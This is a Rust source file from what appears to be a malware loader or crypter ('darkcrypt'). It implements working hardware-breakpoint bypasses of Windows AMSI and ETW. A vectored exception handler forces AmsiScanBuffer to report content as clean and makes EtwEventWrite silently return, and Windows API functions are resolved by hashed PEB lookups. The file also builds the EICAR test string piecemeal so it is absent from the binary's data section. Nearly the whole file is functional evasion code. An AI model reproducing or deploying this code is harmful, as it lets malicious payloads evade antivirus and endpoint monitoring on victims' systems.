// Loader-side HWBP ETW + AMSI bypass.
// Direct port of darkcrypt/src/etw.c + darkcrypt-cs/src/HwbpEtw.cs.
//
// VEH is a raw `extern "system" fn` — no CLR delegate dance needed.

#![allow(dead_code, non_camel_case_types)]

use core::mem;
use core::ptr;
use core::sync::atomic::{AtomicU64, Ordering};

use alloc::vec;
use alloc::vec::Vec;

use crate::{hashes, native, peb};
use native::PVOID;

pub static BP_AMSI_SCAN: AtomicU64 = AtomicU64::new(0);
pub static BP_ETW_WRITE: AtomicU64 = AtomicU64::new(0);
pub static VEH_HANDLE:   AtomicU64 = AtomicU64::new(0);

// ================================================================
// VEH callback. Runs on EXCEPTION_SINGLE_STEP when DR0/DR1 fires.
// MUST NOT allocate or panic.
// ================================================================
unsafe extern "system" fn veh_callback(info: *mut core::ffi::c_void) -> i32 {
    // EXCEPTION_POINTERS:
    //   PEXCEPTION_RECORD ExceptionRecord  @ 0
    //   PCONTEXT          ContextRecord    @ 8
    let exc_record = ptr::read(info as *const *mut u8);
    let ctx_record = ptr::read((info as *const u8).add(8) as *const *mut u8);
    let code = ptr::read(exc_record as *const u32);
    if code != native::STATUS_SINGLE_STEP {
        return native::EXCEPTION_CONTINUE_SEARCH;
    }

    let rip = ptr::read(ctx_record.add(native::CTX_RIP) as *const u64);
    let amsi_bp = BP_AMSI_SCAN.load(Ordering::SeqCst);
    let etw_bp  = BP_ETW_WRITE.load(Ordering::SeqCst);

    // --- AmsiScanBuffer branch: write RESULT_CLEAN=0 to *result, return S_OK ---
    if amsi_bp != 0 && rip == amsi_bp {
        let rsp = ptr::read(ctx_record.add(native::CTX_RSP) as *const u64);
        // AmsiScanBuffer 6th arg = AMSI_RESULT* at [rsp+0x30].
        let result_slot = (rsp + 0x30) as *const u64;
        let result_ptr  = ptr::read(result_slot);
        if result_ptr != 0 {
            ptr::write(result_ptr as *mut i32, 0);  // AMSI_RESULT_CLEAN
        }
        ptr::write(ctx_record.add(native::CTX_RAX) as *mut u64, 0);  // S_OK
        synth_ret(ctx_record, rsp);
        return native::EXCEPTION_CONTINUE_EXECUTION;
    }

    // --- EtwEventWrite branch: just return 0 ---
    if etw_bp != 0 && rip == etw_bp {
        let rsp = ptr::read(ctx_record.add(native::CTX_RSP) as *const u64);
        ptr::write(ctx_record.add(native::CTX_RAX) as *mut u64, 0);
        synth_ret(ctx_record, rsp);
        return native::EXCEPTION_CONTINUE_EXECUTION;
    }

    native::EXCEPTION_CONTINUE_SEARCH
}

// Synthesize a RET: pop [Rsp] into Rip, bump Rsp by 8, clear Dr6, set EFlags.RF.
unsafe fn synth_ret(ctx_record: *mut u8, rsp: u64) {
    let ret_addr = ptr::read(rsp as *const u64);
    ptr::write(ctx_record.add(native::CTX_RIP) as *mut u64, ret_addr);
    ptr::write(ctx_record.add(native::CTX_RSP) as *mut u64, rsp + 8);
    ptr::write(ctx_record.add(native::CTX_DR6) as *mut u64, 0);
    let eflags = ptr::read(ctx_record.add(native::CTX_EFLAGS) as *const u32);
    ptr::write(ctx_record.add(native::CTX_EFLAGS) as *mut u32, eflags | native::EFLAGS_RF);
}

// ================================================================
// One-time VEH install.
// ================================================================
pub type AddVehFn = unsafe extern "system" fn(u32, PVOID) -> PVOID;

pub unsafe fn install_veh_once() -> Result<(), &'static str> {
    if VEH_HANDLE.load(Ordering::SeqCst) != 0 { return Ok(()); }
    let add_veh: AddVehFn = mem::transmute(
        peb::resolve_by_hash(hashes::RTL_ADD_VEH)?
    );
    let cb = veh_callback as unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
    let handle = add_veh(1, cb as PVOID);
    if handle.is_null() {
        return Err("RtlAddVectoredExceptionHandler failed");
    }
    VEH_HANDLE.store(handle as u64, Ordering::SeqCst);
    Ok(())
}

// ================================================================
// Arm DRn on the current thread. slot 0..3, type=exec, len=1.
// ================================================================
pub unsafe fn arm_current_thread(slot: u32, addr: u64) -> Result<(), &'static str> {
    if slot > 3 { return Err("slot out of range"); }

    // CONTEXT buffer: 0x4D0 bytes, 16-byte aligned via Vec<u64>.
    let ctx_words = native::CTX_SIZE / 8;
    let mut ctx = vec![0u64; ctx_words];
    let ctx_ptr = ctx.as_mut_ptr() as *mut u8;

    // ContextFlags
    ptr::write(ctx_ptr.add(native::CTX_CONTEXT_FLAGS) as *mut u32,
               native::CONTEXT_DEBUG_REGISTERS);

    let rc = crate::syscalls::ctx_get(native::CURRENT_THREAD, ctx_ptr as PVOID);
    if !native::nt_success(rc) { return Err("ctx_get failed"); }

    let dr_off = match slot {
        0 => native::CTX_DR0,
        1 => native::CTX_DR1,
        2 => native::CTX_DR2,
        3 => native::CTX_DR3,
        _ => return Err("slot"),
    };
    ptr::write(ctx_ptr.add(dr_off) as *mut u64, addr);

    // DR7: enable local slot bit, clear type+len nibble at 16+slot*4.
    let mut dr7 = ptr::read(ctx_ptr.add(native::CTX_DR7) as *const u64);
    dr7 |= 1u64 << (slot * 2);
    let shift = 16 + slot * 4;
    dr7 &= !((0xFu64) << shift);
    ptr::write(ctx_ptr.add(native::CTX_DR7) as *mut u64, dr7);

    let rc = crate::syscalls::ctx_set(native::CURRENT_THREAD, ctx_ptr as PVOID);
    if !native::nt_success(rc) { return Err("ctx_set failed"); }

    Ok(())
}

// ================================================================
// EtwPatch — install VEH + arm DR1 on EtwEventWrite.
// ================================================================
pub unsafe fn etw_patch() -> Result<(), &'static str> {
    install_veh_once()?;
    let fn_va = peb::resolve_by_hash(hashes::EVENT_WRITE)?;
    BP_ETW_WRITE.store(fn_va as u64, Ordering::SeqCst);
    arm_current_thread(1, fn_va as u64)
}

// ================================================================
// AmsiPatch — load amsi.dll + install VEH + arm DR0 on AmsiScanBuffer.
// ================================================================
pub unsafe fn amsi_patch() -> Result<(), &'static str> {
    install_veh_once()?;
    peb::ensure_amsi()?;
    let fn_va = peb::resolve_by_hash(hashes::AMSI_SCAN)?;
    BP_AMSI_SCAN.store(fn_va as u64, Ordering::SeqCst);
    arm_current_thread(0, fn_va as u64)
}

// ================================================================
// AMSI EICAR self-test — AmsiInitialize + AmsiScanBuffer(EICAR).
// Returns result packed with HR: (hr << 32) | (result as u32).
// ================================================================
pub type AmsiInitFn  = unsafe extern "system" fn(*const u16, *mut PVOID) -> i32;
pub type AmsiOpenFn  = unsafe extern "system" fn(PVOID, *mut PVOID) -> i32;
pub type AmsiCloseFn = unsafe extern "system" fn(PVOID, PVOID) -> i32;
pub type AmsiScanFn  = unsafe extern "system" fn(
    PVOID, *const u8, u32, *const u16, PVOID, *mut i32,
) -> i32;

pub unsafe fn amsi_selftest() -> i64 {
    if peb::ensure_amsi().is_err() {
        return ((0x80004005u64 as i64) << 32) | 0xFFFFFFFFi64;
    }
    let init: AmsiInitFn  = match peb::resolve_by_hash(hashes::AMSI_INIT) {
        Ok(v) => mem::transmute(v), Err(_) => return ((0x80004005u64 as i64) << 32) | 0xFFFFFFFFi64,
    };
    let open: AmsiOpenFn  = match peb::resolve_by_hash(hashes::AMSI_OPEN) {
        Ok(v) => mem::transmute(v), Err(_) => return ((0x80004005u64 as i64) << 32) | 0xFFFFFFFFi64,
    };
    let close: AmsiCloseFn = match peb::resolve_by_hash(hashes::AMSI_CLOSE) {
        Ok(v) => mem::transmute(v), Err(_) => return ((0x80004005u64 as i64) << 32) | 0xFFFFFFFFi64,
    };
    let scan: AmsiScanFn  = match peb::resolve_by_hash(hashes::AMSI_SCAN) {
        Ok(v) => mem::transmute(v), Err(_) => return ((0x80004005u64 as i64) << 32) | 0xFFFFFFFFi64,
    };

    // Build EICAR from char arrays — avoids the full string in .rdata.
    let p1 = ['X','5','O','!','P','%','@','A','P','[','4','\\','P','Z','X','5','4','(','P','^',')'];
    let p2 = ['7','C','C',')','7','}','$','E','I','C','A','R','-','S','T','A','N','D','A','R','D'];
    let p3 = ['-','A','N','T','I','V','I','R','U','S','-','T','E','S','T','-','F','I','L','E','!','$','H','+','H','*'];
    let mut eicar: Vec<u8> = Vec::with_capacity(p1.len() + p2.len() + p3.len());
    for &c in p1.iter() { eicar.push(c as u8); }
    for &c in p2.iter() { eicar.push(c as u8); }
    for &c in p3.iter() { eicar.push(c as u8); }

    // AppName + content name as wide null-terminated.
    let app: Vec<u16> = ['d','c','-','t','e','s','t','\0'].iter().map(|&c| c as u16).collect();
    let content: Vec<u16> = ['d','c','-','e','i','c','a','r','\0'].iter().map(|&c| c as u16).collect();

    let mut ctx: PVOID = ptr::null_mut();
    let hr = init(app.as_ptr(), &mut ctx as *mut PVOID);
    if hr != 0 || ctx.is_null() {
        return ((hr as u32 as u64 as i64) << 32) | 0xFFFFFFFFi64;
    }

    let mut sess: PVOID = ptr::null_mut();
    let _ = open(ctx, &mut sess as *mut PVOID);

    let mut result: i32 = -1;
    let _ = scan(ctx, eicar.as_ptr(), eicar.len() as u32, content.as_ptr(), sess, &mut result as *mut i32);

    if !sess.is_null() { let _ = close(ctx, sess); }

    ((hr as u32 as u64 as i64) << 32) | (result as u32 as i64)
}
